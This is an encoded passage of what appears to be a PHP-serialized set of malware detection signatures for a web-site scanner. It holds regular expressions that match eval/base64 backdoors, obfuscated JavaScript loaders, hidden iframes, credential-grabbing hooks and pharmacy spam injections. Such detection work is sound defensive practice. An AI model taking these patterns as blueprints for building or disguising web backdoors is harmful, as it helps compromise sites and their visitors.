cG9ydGluZ1wofFwoXCRbYS16XF8wLTldK1xzKj1ccypcJF8oUkVRVUVTfEdFfFBPUylUXFspW15cKV=qW1wpXCY7XHNdKyk_XEA_cHJlZ19yZXBsYWNlW1woIFx=XSsoWyciXSkoW1whXC9cI1x8XEBcJVxeXCpcfl=pLis_XDVbaW1zeF=qZVtpbXN4XSpcNFsgXHRdKixbXixdKyxbXlwpXStbXCk7XHNdKihcPz58JCkvaSI7fXM6MTk6InByZWdfcmVwbGFjZSAvZSBoZXgiO2E6Mjp7aTowO3M6NToiSDE1OXMiO2k6MTtzOjI=NzoiLygoXC97Mn=uKnxcJFthLXpfMC=5XStccyo9LispXHMqKSooXCRbYS16XzAtOV=rfHByZWdfcmVwbGFjZSlccypcKFxzKihbJyJdKShbXCFcL1wjXHxcQFwlXF5cKlx-XXxcXFt4MC=5XXsxLDN9KS4rPyhcNVtpbXN4XSplW2ltc3hdKnxcXHg2NXxcXDE=NSlcNFxzKixccyooWyciXVxceFswLTlBLUZdezJ9fFwkKD8hY2IsIFwkZW5jb2RlZF92YWx1ZVxbXCRrZXlcXVwpOykoPyFyZXBsXC4nOykpW14sXSssW15cKV=rW1wpO1xzXSovaSI7fXM6MzE6InByZWdfcmVwbGFjZSAvZSBzdHJfcmVwbGFjZSBoZXgiO2E6Mjp7aTowO3M6NToiRjZGSW4iO2k6MTtzOjE=NjoiL1xAP3ByZWdfcmVwbGFjZVxzKlwoXHMqWyciXS4rW1wvXCNcfF1baXNdKmVbaXNdKlsnIl1ccyosXHMqXEA_KFwkXyhSRVFVRVN8R=V8UE9TKVRcW3xzdHJfcmVwbGFjZVwoKFsnIlxzLFwuXCRdKlxceFswLTlBLUZdWzAtOUEtRl=pKykuKlwpW1xzO1=qL2kiO31zOjE3OiJldmFsIGZyb21DaGFyQ29kZSI7YToyOntpOjA7czo1OiJGOEdERiI7aToxO3M6Mjk3OiIvKDxzY3JpcHRbXj5dKj5ccyooKCh2YXJccyopP1thLXpfMC=5XStccyooO1xzKlthLXpfMC=5XStccyo9XHMqW2Etel8wLTldW1xzXC5dKmxlbmd=aHxbXC49XStccyooWyInXSkuKj9cNlxzKnxbLD1dK1xzKlxbW15cXV=qXF=rXHMqKSs7XHMqKStmb3JbXlx7XStce1xzKlteXH1dK2Zyb21DaGFyQ29kZVwoW15cfV=rW1x9XHNdKyhbYS16XzAtOV=rXHMqPVteO1=rO1xzKikqZG9jdW1lbnRcLndyaXRlXCh8ZXZhbFwoLipmcm9tQ2hhckNvZGVcKChccypbMC=5XStccyosKSspW147XSs7XHMqPFwvc2NyaXB=PlxzKikrL2kiO31zOjI1OiJpbmlfcmVzdG9yZSBiYXNlNjRfZGVjb2RlIjthOjI6e2k6MDtzOjU6IkgxT=5nIjtpOjE7czo5NzoiLzxcP1twaFxzXStpbmlfcmVzdG9yZVxzKlwoLitccysuK2Jhc2U2NF9kZWNvZGVccypcKC4rXHMrLitwaHBcLmluaS4rXHMrLitmd3JpdGVccypcKFtcU1xzXStcPz4vaSI7fXM6MTg6ImV2YWwgYmFzZTY=X2RlY29kZSI7YToyOntpOjA7czo1OiJHMTFEZiI7aToxO3M6Mjk4OiIvKFwvXCpbXlwqXSooXCpbXlwqXC9dKikrXC9ccyp8XC9cL1teXG5dKlxzKykqKFxAP2Vycm9yX3JlcG9ydGluZ1woW15cKV=qXCkrO1xzKi4rXHMqKT8oYmFzZTY=X2RlY29kZVwoLitccyopP1xAP2V2YWxccyooXC9cKlteXCpdKihcKlteXCpcL1=qKStcL1xzKnxcL1wvW15cbl=qXHMrKSpcKFteXCldKmJhc2U2NF9kZWNvZGVccyooXC9cKlteXCpdKihcKlteXCpcL1=qKStcL1xzKnxcL1wvW15cbl=qXHMrKSpcKFteXCldKyhcKVxzKihcL1wqW15cKl=qKFwqW15cKlwvXSopK1wvXHMqfFwvXC9bXlxuXSpccyspKikrOy9pIjt9czozMzoiZXJyb3JfcmVwb3J=aW5nIHZhcmlhYmxlLWZ1bmN=aW9uIjthOjI6e2k6MDtzOjU6IkQ2QUFiIjtpOjE7czo5NDoiLzxcPyhwaHApP1tcclxuIFx=XSooXCRbYS16XF8wLTldKylbXHQgPV=rWyciXS4rWyciXVs7IFx=XStbXEBdP2Vycm9yX3JlcG9ydGluZ1woLitcMlwoLitcPz4vaSI7fXM6MTk6ImVjaG8gc2NyaXB=IGlmcmFtZSAiO2E6Mjp7aTowO3M6NToiSDFOOWQiO2k6MTtzOjEzOToiL1wjW2Etel9cLT=wLTldK1wjW1xzXEBdK2VjaG8uKzxzY3JpcHQuK1wuY3JlYXRlRWxlbWVudFtcKFxzIiddK2lmcmFtZS4rXC5zdHlsZVwuKGxlZnR8dG9wKT1bJyJcXF=rLS4rPFwvc2NyaXB=Pi4rO1xzK1wjXC9bYS16X1wtPTAtOV=rXCMvaSI7fXM6MTM6ImV2YWwgX1JFUVVFU1QiO2E6Mjp7aTowO3M6NToiRzFWOHEiO2k6MTtzOjE2NjoiL1tcQF=qKGVycm9yX3JlcG9ydGluZ1woLitiYXNlNjRfZGVjb2RlXCguKykqKD88IWwpZXZhbFsgXHRdKihcL1wqLipcKlwvKSpbIFx=XSpcKFsgXHRdKihcL1wqLipcKlwvKSpbIFx=XSpcJF8oUkVRVUVTfEdFfFBPUylUXFsuKz9cXS4qP1wpWyBcdF=qKFwvXCouKlwqXC8pKlsgXHRdKjsvaSI7fXM6MTg6ImZvcmVhY2ggZXZhbCBhcnJheSI7YToyOntpOjA7czo1OiJIMTRMNyI7aToxO3M6MjI5OiIvKFwvXCpccysoW2Etel9cLTAtOV=rKVxzKlwqXC9ccyp8PFw_W3BoXHNdKykoXCRbYS16XzAtOV=rKVxzKj1ccyphcnJheVteO1=rO1xzKi4rP2Z1bmN=aW9uIChbYS16XzAtOV=rKVwoLis_cmV=dXJuW147XSo7WztcfVxzXSsoXCRbYS16XzAtOV=rKVxzKj1ccypcNFxzKlwoXHMqXDNbXjtdKztccypldmFsXChcNVteO1=rWyciXClcfTtcc1=rKFwvXCpccytcL1wyXHMqXCpcL3wuKz8oJHxcPz4pKS9pIjt9czozMToiZXhjZXNpdmUgc3BhY2VzIGluIGhhc2hlZCBibG9jayI7YToyOntpOjA7czo1OiJDQ1Y4RiI7aToxO3M6NTc6Ii9cI1thLXpBLVowLTldK1wjW1xuIFx=XXs1MH=uK1tcbiBcdF=rXCNcL1thLXpBLVowLTldK1wjLyI7fXM6Mjk6IkphdmFzY3JpcHQgb2JzY3VyZSBldmFsIGFycmF5IjthOjI6e2k6MDtzOjU6IkZCNEtkIjtpOjE7czoxNTI6Ii8oXC9cKlswLTlhLWZdezMyfVwqXC8pXHMqKHRyeVx7fHZhclxzK1thLXpfMC=5XStccyo9KFxzKltcWyxdXHMqKFsnIl=pKFxceFswLTlhLWZdezJ9KStcNCkrLispZG9jdW1lbnRccyooXFtbXlxdXStbXF1cc1=rKStcKFthLXpfMC=5XStcKStbXH1ccztdK1wxL2lzIjt9czozMDoiSmF2YVNjcmlwdCBmdW5jdGlvbiB4Vmlld1N=YXRlIjthOjI6e2k6MDtzOjU6IkQ3OExqIjtpOjE7czoxMDc6Ii88c2NyaXB=IGxhbmd1YWdlPVsnIl1KYXZhU2NyaXB=WyciXT5bXHJcbiBcdF=qZnVuY3Rpb24gW2EtejAtOV=rVmlld1N=YXRlXChcKSguKz9bXHJcbiBcdF=qKSs_PFwvc2NyaXB=Pi9pIjt9czoyOToiYWRkLWRpdi1jb25=ZW5=IFZpYWdyYSBDaWFsaXMiO2E6Mjp7aTowO3M6NToiRDQ2SGIiO2k6MTtzOjg5OiIvPFwhLS1zdGFydC1hZGQtZGl2LWNvbnRlbnRbMC=5XSotLT4uK1ZpYWdyYS4rQ2lhbGlzLis8XCEtLWVuZC1hZGQtZGl2LWNvbnRlbnRbMC=5XSotLT4vaSI7fXM6MjE6ImphdmFzY3JpcHQgYXJyYXkgZXZhbCI7YToyOntpOjA7czo1OiJFQ=xOViI7aToxO3M6OTA6Ii92YXJccypbX1wtXD5cLmEtejAtOV=rXHMqPVxzKlxbXHMqWyciXShcXHhbMC=5QS1GXXsyfSkrWyInXVteXF1dKlxdLis_ZXZhbFxzKlwoLis_XCkrOyovaSI7fXM6MjQ6Imlzc2V=IFJFUVVFU1QgZXZhbCBhbG9uZSI7YToyOntpOjA7czo1OiJGOEdCTyI7aToxO3M6MTU=OiIvPFw_W3BoXHNdKyhcJFtfXC1cPlwuYS16MC=5XStccyo9XHMqKFsnIl=pLis_XDI7XHMqKSppZltcc1woXSsoW2Etel8wLTldK1xzKlwoXHMqKSpcJF8oUkVRVUVTfEdFfFBPUylUXFsuKyhzeXN=ZW18ZXZhbClcKC4rXHMqZXhpdFteO1=qWztccypcfV=rKCR8XD8-KS9pIjt9czozNDoiaXNzZXQgSFRUUF9VU=VSX=FHRU5UIGhlYWRlciBhbG9uZSI7YToyOntpOjA7czo1OiJEMU9ORiI7aToxO3M6OTg6Ii88XD9waHAgaWZcKGlzc2V=XChcJF9TRVJWRVJcW1snIl1IVFRQX1VTRVJfQUdFTlRbJyJdXF=uK2hlYWRlclwoWyciXUxvY2F=aW9uOiBodHRwOlwvXC8uKztcfVw_Pi9pIjt9czoyNToic3RycmV2IEFzc2VydCBldmFsIGJhc2U2NCI7YToyOntpOjA7czo1OiJEMjRJSCI7aToxO3M6MjIwOiIvW1xyXG4gXHRdKy4rP1woWyInXShcXDE=NXxlKShcXDE2Nnx2KShcXDE=MXxhKShcXDE1NHxsKShcXDA1MHxcKCkoXFwxNDJ8YikoXFwxNDF8YSkoXFwxNjN8cykoXFwxNDV8ZSkoXFwwNjZ8NikoXFwwNjR8NCkoXFwxMzd8XykoXFwxNDR8ZCkoXFwxNDV8ZSkoXFwxNDN8YykoXFwxNTd8bykoXFwxNDR8ZCkoXFwxNDV8ZSkoXFwwNTB8XCgpLis_XFwwNTFcXDA1MVxcMDczWyInXVwpOy9pIjt9czoyNDoiUmV=cnkgYmFzZTY=X2RlY29kZSBDdXJsIjthOjI6e2k6MDtzOjU6IkQyU=NRIjtpOjE7czoxMzk6Ii88XD9waHBbXHJcbiBcdF=raWYgXCghaXNzZXRcKFwkc1JldHJ5XClcKS4rP=hUVFBfVVNFUl9BR=VOVC4rP2Jhc2U2NF9kZWNvZGVcKC4rP2N1cmxfZXhlYy4rP2N1cmxfY2xvc2VcKFwkc3RDdXJsSGFuZGxlXCk7W1xyXG4gXHRcfV=rXD8-L3MiO31zOjIwOiJwcmVnX3JlcGxhY2UgYWxsIGhleCI7YToyOntpOjA7czo1OiJGNzE=TyI7aToxO3M6NTY6Ii9cQCpwcmVnX3JlcGxhY2VccypcKChbXlwpXSo_XHhbMC=5QS1GXXsyfSl7MTUsfS4rP1wpOy9pIjt9czoxNDoiaWZyYW1lIGluIGhlYWQiO2E6Mjp7aTowO3M6NToiRDUzSFAiO2k6MTtzOjU2OiIvXDxpZnJhbWUgLitcPFwvaWZyYW1lXD5bXHJcbiBcdF=qKD89XDxcL2godG1sfGVhZClcPikvaSI7fXM6MzY6IlRhZ2dlZCBzY3JpcHQgdHJ5IGRvY3VtZW5=LmJvZHkgZXZhbCI7YToyOntpOjA7czo1OiJHMkdERyI7aToxO3M6MTg3OiIvPFwhLS1bYS16XzAtOVxzXSstLT5ccyo8c2NyaXB=IC4rPyhiZHZfcmVmX3BpZD=oWzAtOV=rKTsuKz88XC9zY3JpcHQ-XHMqPHNjcmlwdCAuKz9waWQ9XDJ8dHJ5XHtkb2N1bWVudFwuYm9keS4rP2V2YWwpLis_PFwvc2NyaXB=PlxzKig8bm9zY3JpcHQuKzxcL25vc2NyaXB=PlxzKik_PFwhLS1bXC9hLXpfMC=5XHNdKy=tPi9pIjt9czoyOToiVGFnZ2VkIHRyeSBkb2N1bWVudC5ib2R5IGV2YWwiO2E6Mjp7aTowO3M6NToiRDNKN=4iO2k6MTtzOjkxOiIvXC9cKlswLTlhLWZdK1wqXC9bXHJcbiBcdF=rLis_dHJ5XHtkb2N1bWVudFwuYm9keS4rP2V2YWwuKz9bXHJcbiBcdF=rXC9cKlwvWzAtOWEtZl=rXCpcLy9pIjt9czozNzoiZXZhbCB2YXJpYWJsZS1mdW5jdGlvbiBsb25nLW5iLXN=cmluZyI7YToyOntpOjA7czo1OiJGNk1EaCI7aToxO3M6MTQxOiIvKChcL1wvLit8XCRbYS16XF8wLTlcW1xdXHtcfSciXStccyo9W15cO1=rOylccyopKlxAPyhldmFsfGFzc2VydClcKChcJFthLXpcXzAtOVxbXF1ce1x9JyJdK1woKStbJyJdW2EtekEtWjAtOVwvXF9cLVwrXD1cclxuXXsyMDAsfVsnIl1cKSs7L2kiO31zOjQxOiJmdW5jdGlvbiBvYl9nZXRfbGV2ZWwgb2Jfc3RhcnQgYWRkX2FjdGlvbiI7YToyOntpOjA7czo1OiJEM=xBNCI7aToxO3M6MTg4OiIvaWYgXChcIWZ1bmN=aW9uXF9leGlzdHNcKC4rP1wpIFx7W1xyXG4gXHRdK2Z1bmN=aW9uIC4rP1wpIFx7W1xyXG4gXHRdK2lmIFwoXCFvYlxfZ2V=XF9sZXZlbFwoXClcKSBvYlxfc3RhcnRcKC4rP1wpO1tcclxuIFx=XStcfVtcclxuIFx=XSsoLitbXHJcbiBcdF=rKSsoYWRkX2FjdGlvblwoLis_XCk7W1xyXG4gXHRdKykrXH=vaSI7fXM6MjY6ImhlYWQgc2NyaXB=IGRvY3VtZW5=LndyaXRlIjthOjI6e2k6MDtzOjU6IkQzUEQ1IjtpOjE7czo2MjoiLyg_PD1cPFwvaGVhZFw-KVw8c2NyaXB=Lis_ZG9jdW1lbnRcLndyaXRlXCguKz9cPFwvc2NyaXB=XD4vc2kiO31zOjE=OiJzY3JpcHQgaHR=cCBJUCI7YToyOntpOjA7czo1OiJHM=c4OCI7aToxO3M6MjY3OiIvKD88IVsnIl=pPHNjcmlwdFtePl=qKHNyYz1bJyJdP2h=dHBbc1=_XDpcLygoW1wvfFwuXVswLTldKyl7NH18XC93d3dcLmFkc3B=cFwuY29tfFwvY2RuXC5wb3BjYXNoXC5uZXQpXC98Y29sbGVjdFwuanN8XC93cC1pbmNsdWRlc1wvanNcL2pjcm9wXC9qcXVlcnlcLmpzfD4uKmh=dHA6XC9cL21icy1zdXBwb3J=XC5jb21cL2pzXC9qcXVlcnlcLm1pblwucGhwLipkb2N1bWVudFwud3JpdGVcKFsiJ1=8c2NyaXB=LipcL3NjcmlwdClbXj5dKj4uKj88XC9zY3JpcHQ-L2kiO31zOjE4OiJzY3JpcHQgZW5jb2RlIGV2YWwiO2E6Mjp7aTowO3M6NToiRTk3R28iO2k6MTtzOjEwNToiLzxzY3JpcHQuKz8oKFswLTlBLUZ4XXsyMDB9fChbJyJdPyxbIiddP1swLTlBLUZ4XSspezIwMH=uKz9ldmFsKXwoZXZhbC4rP1swLTkgXHRcLF17MzAwfSkpLis_PFwvc2NyaXB=Pi9pIjt9czo1NDoiVGFnZ2VkIGJhc2U2NF9kZWNvZGUgZmlsZV9nZXRfY29udGVudHMgcG9zaXRpb24gaWZyYW1lIjthOjI6e2k6MDtzOjU6Ikc=RklWIjtpOjE7czozOTM6Ii8oKFwvXCp8XCMpXHMqKFthLXpfMC=5XStccyooXDJ8XCpcLykpXHMqLis_YmFzZTY=X2RlY29kZS4rP1xzKi4rP2ZpbGVfZ2V=X2NvbnRlbnRzLis_XHMqLis_cG9zaXRpb24uKz9ccyouKz88XC9pZnJhbWU-LitccyooXC9cKnxcIylbXC9cc1=qXDN8aWZccypcKFteXHtdKigoZ29vZ2xlfGJvdHx5YWhvb3xiaW5nfEhUVFBfVVNFUl9BR=VOVClbXlx7XSspezUsfVx7KChcJFthLXpfMC=5XStbXHNcLlwrXSo9XHMqKT8oc2h1ZmZsZXxhcnJheSlcKFteO1=rO1xzKikqZm9yZWFjaFwoW15ce1=rXHtccyppZlxzKlwocHJlZ19tYXRjaFxzKlwoW15ce1=rXHtccyouKz8oW1xAXH5cc1=qKGJhc2U2NF9kZWNvZGV8ZmlsZV9nZXRfY29udGVudHMpXHMqXCgpezN9Lis_XHMqKFx9XHMqKXszfSkvaSI7fXM6MTU6InNjcmlwdCBhamF4IFBPQyI7YToyOntpOjA7czo1OiJHN=c4TyI7aToxO3M6MTkwOiIvPHNjcmlwdFtePl=rKFZCU2NyaXB=Lis_Q3JlYXRlT2JqZWN=XChbJyJdU2NyaXB=aW5nXC5GaWxlU3lzdGVtT2JqZWN=WyciXVwpLis_XC5DcmVhdGVUZXh=RmlsZVwoLis_XC5Xcml=ZS4rP=NyZWF=ZU9iamVjdFwoWyciXVdTY3JpcHRcLlNoZWxsWyciXVwpLis_fGFqYXgucGhwWyciXT5bJyJdUE9DWyciXSk8XC9zY3JpcHQ-L2lzIjt9czoyNjoidGFyZ2V=cyBhcnJheSBKQVBsdWdpbkRvbmUiO2E6Mjp7aTowO3M6NToiRDQ5QUoiO2k6MTtzOjgxOiIvKFwvXC9maWxlc1tcdCBcclxuXSspKlwkdGFyZ2V=c1sgPVx=XSthcnJheVwoLis_ZWNob1sgIiddK=pBUGx1Z2luRG9uZVsgIic7XSsvc2kiO31zOjE1OiJpbmNsdWRlIGZhdmljb24iO2E6Mjp7aTowO3M6NToiRDRBN1EiO2k6MTtzOjQ2OiIvW1xyXG5dK1tcdCA7XSppbmNsdWRlLitmYXZpY29uXC5pY29bJyJcKTtdKy9pIjt9czoxNToiYWRkX2ZpbHRlciBjcmVkIjthOjI6e2k6MDtzOjU6IkQ=SjdXIjtpOjE7czo5MzoiL2FkZF9maWx=ZXJcKCd=ZW1wbGF=ZV9pbmNsdWRlJywnZ2V=X2NyZWQnLDFcKTtbXHQgXHJcbl=rYWRkX2ZpbHRlclwoJ3NodXRkb3duJywnY3JlZCcsMFwpOy9pIjt9czoyMToicHJlZ19yZXBsYWNlIHN=cnJldiBlIjthOjI6e2k6MDtzOjU6IkQ=T=ZkIjtpOjE7czo4NzoiL1wkW2EtekEtWjAtOVxfXStbXD=gXHRdK1snIl1lXC9cKlwuXC9bJyJdO1tcclxuIFx=XStwcmVnX3JlcGxhY2VcKFsgXHRdKnN=cnJldlwoLipcKTsvIjt9czo3NzoiZnVuY3Rpb25fZXhpc3RzIGdldCBmaWxlIGZ1bmN=aW9uIGN1cmxfaW5pdCBmaWxlX2dldF9jb25=ZW5=cyBmb3BlbiBjdXJsX2V4ZWMiO2E6Mjp7aTowO3M6NToiRzJQQUkiO2k6MTtzOjM3NDoiLzxcP1twaFxzXSsoKGluaV9zZXR8XCRbYS16XzAtOV=rXHMqPSlbXjtdKztccyopKmZ1bmN=aW9uXHMrKFthLXpfMC=5XSspW15ce1=rW1xzXHtdKyhcJFthLXpfMC=5XStccyo9W147XSs7XHMqKSooZm9yZWFjaFteXHtdK1tcc1x7XSsoXCRbYS16XzAtOV=rXHMqKFxbW15cXV=rXF=rXHMqKSo9XHMqKT9jdXJsX2luaXQuKz9yZXR1cm5bXjtdKjt8KHJldHVyblxzKyk_Y3VybF9bXjtdKztccyopK1tcfVxzXSsoKFwkW2Etel8wLTldK1xzKj1ccyopPyhcJF9TRVJWRVJcW3xcM1wofGZvcGVuXCh8ZndyaXRlXCh8ZmNsb3NlXCgpW147XSs7XHMqKSooaWZbXHNcKF=rKGZpbGVfZXhpc3RzXCh8XCRfKFJFUVVFU3xHRXxQT1MpVFxbKS4rP1wzXCguKyl7Mn=vaXMiO31zOjMxOiJlcnJvcl9yZXBvcnRpbmcgaW5jbHVkZSB3cC1hcHBzIjthOjI6e2k6MDtzOjU6Ikc2UEVLIjtpOjE7czoxNjg6Ii8oKFwkW2Etel8wLTldK1tccz1dKyk_KGVycm9yX3JlcG9ydGluZ3xpbmlfc2V=fGdldGVudnxzdWJzdHIpXChbXlwpXSpcKSs7XHMqKSpcQCoocmVxdWlyZXxpbmNsdWRlKShfb25jZSk_W1woIidcc1=rW147XSt3cC=oaW5jbHVkZXN8aGVhZHxhcHBzfHRleHQpXC5waHBbIiddW1wpO1xzXSsvaSI7fXM6MzU6InJlcXVpcmUgY2dpLWxvY2FsIHBocCBjb21tZW5=IGFsb25lIjthOjI6e2k6MDtzOjU6IkY3TUI1IjtpOjE7czoxODc6Ii88XD9bcGhcc1=rKFwvXCouKz9cKlwvXHMqfFxAKSoocmVxdWlyZXxpbmNsdWRlKShfb25jZSkqW1woXHNdKyhcJF9TRVJWRVJbXFtce11bIiddRE9DVU1FTlRfUk9PVFsnIl1bXF1cfV1bXHNcLl=rWyInXVtcLlwvXSp3cC1bXjtdK3xbJyJdY2dpLWxvY2FsXC8uKz9cLnBocFsnIl1bXHNcKV=qKTtccysoXCMuKlxzKikqXD8-L2kiO31zOjUyOiJvYl9zdGFydCBnemluZmxhdGUgb2JfZ2V=X2NvbnRlbnRzIG9iX2VuZF9jbGVhbiBldmFsIjthOjI6e2k6MDtzOjU6IkczNkQ4IjtpOjE7czozMjE6Ii88XD9bcGhcc1=qKFtpZlwoXHNcIV=qZGVmaW5lKGRccypcKFteXCldK3xccypcKFteLF=rLFxzKihbYS16XzAtOVwoXSspKVteXCldKltcKTtcc1x7XH1dKykqKFxAfFwkW2Etel8wLTldK1tcc1wuXSo9XHMqKSpvYl9zdGFydFxzKlwoKFsnIlxzXSsoLio_KVsnIlxzXStcKTtccypmdW5jdGlvblxzK1w2XCguKz9mdW5jdGlvblxzK1wzLityZXR1cm5ccyooWyciXSlbXlw3XSpcN3xnemluZmxhdGVbXChcc1=rb2JfZ2V=X2NvbnRlbnRzW1woXCk7XHNdK29iX2VuZF9jbGVhbltcKFwpO1xzXStldmFsXChbXlwpXStbXClcc1=qKTtbXHNcfV=qKCR8XD8-XHMqKS9pcyI7fXM6MTc6InRhZ2dlZCBpZnJhbWUgMXB4IjthOjI6e2k6MDtzOjU6IkQ2MzZyIjtpOjE7czoxMjI6Ii88XCEtLSAuKz8gLS=-W1xyXG4gXHRdKjxpZnJhbWUgd2lkdGg9IjFweCIgaGVpZ2h=PSIxcHgiIHNyYz=iaHR=cDpcL1wvW14-XSs-W1xyXG4gXHRdKjxcL2lmcmFtZT5bXHJcbiBcdF=qPFwhLS=gLis_IC=tPi9pIjt9czoyOToic2NyaXB=IGFmdGVyIGNsb3NpbmcgYm9keSB=YWciO2E6Mjp7aTowO3M6NToiRzVNOUciO2k6MTtzOjc2OiIvKD88PVw8XC8oYm9keXxoZWFkKVw-KShccyo8KChzY3JpcHR8YSlbXHM-XS4qPzxcLyhcNHxib2R5KXxtZXRhW14-XSopPikrL2lzIjt9czoyNzoidmFyIFIgZnVuY3Rpb24gcFlNdVMgd2luZG93IjthOjI6e2k6MDtzOjU6IkY=OThLIjtpOjE7czoxOTI6Ii88c2NyaXB=W14-XSo-XHMqKHZhclxzKyk_KFthLXpfMC=5XSspXHMqPVxzKlxbLis_KChbYS16XzAtOV=rKVxzKj1ccypcMlxbW15cXV=rW1xdXHNdK1wrXDJcWy4rP1x7XHMqd2luZG93W1xbXHNdK1wyW1xbXHNdK1teXF1dK1tcXVxzXSs9XDRbXH=7XHNdK3xmdW5jdGlvbiBwWU11U1woLis_XClcKHdpbmRvd1wpKTxcL3NjcmlwdD4vaSI7fXM6MzE6IlRhZ2dlZCBlY2hvIHNjcmlwdCBldmFsIEhleEhleF8iO2E6Mjp7aTowO3M6NToiRDZVSXIiO2k6MTtzOjEyMjoiL1wjKFthLXowLTldKylcI1tcclxuIFx=XStlY2hvW1xyXG4nIiBcdF=rPHNjcmlwdCouKz9ldmFsLis_KFthLXowLTldW2EtejAtOV1cXyl7MTAwfS4rPzxcL3NjcmlwdD5bXHJcbiciOyBcdF=rXCNcL1wxXCMvaXMiO31zOjMxOiJ2YXJpYWJsZSBjcmVhdGVfZnVuY3Rpb24gc3RycmV2IjthOjI6e2k6MDtzOjU6IkcySUkxIjtpOjE7czoyNDY6Ii88XD9bcGhcc1=qKFwvXCpbXlwqXSooXCpbXlwqXC9dKikrXC9ccyp8XC9cL1teXG5dKlxzKykqKChcJFthLXpfMC=5XSspXHMqPSk_LitmdW5jdGlvblxzKihbYS16XzAtOV=qKVwoLis_KGV2YWxcKFw1XCh8YmFzZTY=X2RlY29kZVwofFxzKlw=XHMqXChccypzdHJyZXZcKCkuKz8oXClccyopezIsfTtccyooZXZhbFwoLis_KFwpXHMqKXsyLH=7XHMqfFwkW2Etel8wLTldK1xzKj1bXjtdKztccyp8XDFccyopKigkfFw_PlxzKikvaSI7fXM6MjI6Imh=bWwgZW1iZWQgb2JqZWN=IGh=bWwiO2E6Mjp7aTowO3M6NToiRDg3OXYiO2k6MTtzOjU3OiIvPGh=bWw-W1xyXG4gXHRdKjxlbWJlZC4rPzxcL29iamVjdD5bXHJcbiBcdF=qPFwvaHRtbD4vaXMiO31zOjM2OiJyZXF1aXJlIG5ldyBTQVBFX2NsaWVudCByZXR1cm5fbGlua3MiO2E6Mjp7aTowO3M6NToiRzFDTmoiO2k6MTtzOjY3OiIvKFwkW2Etel8wLTldKylccyo9XHMqbmV3XHMqU=FQRV9jbGllbnRcKC4rP1wxLT5yZXR1cm5fbGlua3NcKFwpOy9zIjt9czo5MzoiaWYgZnVuY3Rpb25fZXhpc3RzIF9waHBfY2FjaGVfc3BlZWR1cF9mdW5jX29wdGltaXplcl8gcmVnaXN=ZXJfc2h1dGRvd25fZnVuY3Rpb24gb2JfZW5kX2ZsdXNoIjthOjI6e2k6MDtzOjU6IkY2RzdqIjtpOjE7czoxNTA6Ii9bO1xzXSppZlxzKlwoXCFmdW5jdGlvbl9leGlzdHNcKFsnICJdK19waHBfY2FjaGVfc3BlZWR1cF9mdW5jX29wdGltaXplcl9bJyAiXStcKVwpLis_cmVnaXN=ZXJfc2h1dGRvd25fZnVuY3Rpb25cKFsnICJdK29iX2VuZF9mbHVzaFsnICJdK1wpWztcc1=qXH=vcyI7fXM6NDQ6ImVycm9yX3JlcG9ydGluZyBpbmlfc2V=IGlmIGNvdW5=IFBPU1QgcmV=dXJuIjthOjI6e2k6MDtzOjU6IkQ4TUJuIjtpOjE7czoxMTM6Ii9bXEBdKmVycm9yX3JlcG9ydGluZ1woMFwpOyhbXEAgXHJcbl=qaW5pX3NldFwoKC4rPylcKVs7IFxyXG5dKikraWYgXChjb3VudFwoXCRfUE9TVC4rcmV=dXJuIFwkW2EtejAtOV=rWzsgXH1dKy9pIjt9czozODoiZGl2IFZpYWdyYSBDaWFsaXMgc2NyaXB=IHN=eWxlLmRpc3BsYXkiO2E6Mjp7aTowO3M6NToiRDlIQ2YiO2k6MTtzOjE=MzoiLzxkaXYgaWQ9WyciXShbXj5dKilbJyJdPi4qVmlhZ3JhLitDaWFsaXMuKjxcL2Rpdj5bXHJcbiBcdF=qPHNjcmlwdFtePl=qPi4qZG9jdW1lbnRcLmdldEVsZW1lbnRCeUlkXChbIiddXDFbIiddXClcLnN=eWxlXC5kaXNwbGF5Lio8XC9zY3JpcHQ-L2kiO31zOjcxOiJwaHAgdmFyaWFibGUgYXJyYXkgYmFzZTY=X2RlY29kZSBmdW5jdGlvbl9leGlzdHMgbnVtZXJpYy1uYW1lZCBmdW5jdGlvbiI7YToyOntpOjA7czo1OiJHNktLbyI7aToxO3M6Mzc1OiIvPFw_W3BoXHNdKyhcL1wqKFteXCpdKlwqW15cL1=pKlteXCpdKlwqXC9ccyp8XC9cL1teXG5dKlxzKykqXCRbYS16XzAtOSciXFtcXVxzXSs9XHMqYXJyYXlcKC4qP2Jhc2U2NF9kZWNvZGVcKC4rP1wpKztccyooaWZccypcKFwhZnVuY3Rpb25fZXhpc3RzXChbIiddX1swLTldK1siJ11bXClcc1=rXHtccyp8XD8-XHMqPFw_W3BoXHNdKykqZnVuY3Rpb24gX1swLTldK1woKC4rPylbXH1cc1=rKFw_PlxzKjxcP1twaFxzXStcQD9cJEdMT=JBTFNccyooXFtbXlxdXSpcXStccyp8XHtbXlx9XSpcfStccyopK1woLisoZXZhbHxcJEdMT=JBTFMoXHMqXFtbXlxdXSpcXStccyp8XHtbXlx9XSpcfSspKylccypcKFteXCldK1tcKTtcfVxzXSspKihcMXwkfFw_PikrL2kiO31zOjMyOiJUYWdnZWQgaWYgZW1wdHkgc2NyaXB=IGV2YWwgZWNobyI7YToyOntpOjA7czo1OiJFMUc4OCI7aToxO3M6MTc3OiIvXCMoW2EtejAtOV=rKVwjW1xyXG4gXHRdK2lmWyBcdF=qXChlbXB=eVwoKFwkW2Etel8wLTldKylcKVwpW1xyXG5ceyBcdF=rXDJbXHJcbiciID1cdF=rPHNjcmlwdC4rPyhldmFsfHNyYz1bXFwnIl=raHR=cCkuKz88XC9zY3JpcHQ-W1xyXG4nIjsgXHRdK2VjaG8gXDJbXHJcbjsgXH1cdF=rXCNcL1wxXCMvaXMiO31zOjQ=OiJ2YXIgSFRUUF9VU=VSX=FHRU5UIGlmIG1hdGNoIHN=cmluZyB2YXIgZWxzZSI7YToyOntpOjA7czo1OiJEQUpIMiI7aToxO3M6MTI2OiIvKFwkW2EtelxfMC=5XSspW1x=ID1dK1wkX1NFUlZFUlxbWyInXUhUVFBfVVNFUl9BR=VOVFsnIl1cXTsuKz9pZiBcKFwkW2EtelxfMC=5XStcKFteLF=rLCBcMVwpXCkgXHtbXlx9XStcfSBlbHNlIFx7W15cfV=rXH=vaXMiO31zOjM=OiJkaXYgcGhwIGVycm9yX3JlcG9ydGluZyBmb3BlbiBodHRwIjthOjI6e2k6MDtzOjU6Ikc4UTdYIjtpOjE7czo4NDoiLzxkaXYgW14-XSo-XHMqPFw_W3BoXHNdK2Vycm9yX3JlcG9ydGluZ1woLis_Zm9wZW5cKFsiJ11odHRwOlwvXC8uKz9cPz5ccyo8XC9kaXY-L2lzIjt9czo2OToiRE9DVU1FTlRfUk9PVCB